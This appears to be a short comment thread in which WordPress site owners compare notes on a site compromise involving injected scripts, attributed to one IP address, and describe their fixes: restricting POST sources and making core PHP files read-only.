      I've added a bevy of IP CIDR blocks to my POST restrictions, and I'm definitely going to review all of Wordpress for this.

      As far as I can tell, this is a well know vulnerability, and Automattic has since fixed the issue. In my case, to remedy the situation, I changed the permissions to read only in wp-includes, wp-admin, as well as reviewed all the files to remove the injected scripts.

      I found this by searching "194.110.162.23" because my wordpress got hijacked as well. I stil don't really know what and how that happened. Do you have any more information? How did they get access?

      Hi Michi, there are probably a bunch of different ways its done, but in my case, here's what I *think* happened:<br/><br/>1. Abuser registered and gained access to some basic functionality -or- used a cookie to execute some malicious code, not sure<br/>2. My server files had incorrect permissions - the web server was able to write to the wp-includes directory and files<br/>3. Abuser modified files to act as a gateway to execute their own php scripts (and shell scripts?) on server<br/><br/>I made several changes to my setup, an important one being to change all the wordpress php files to be only readable by the webserver.
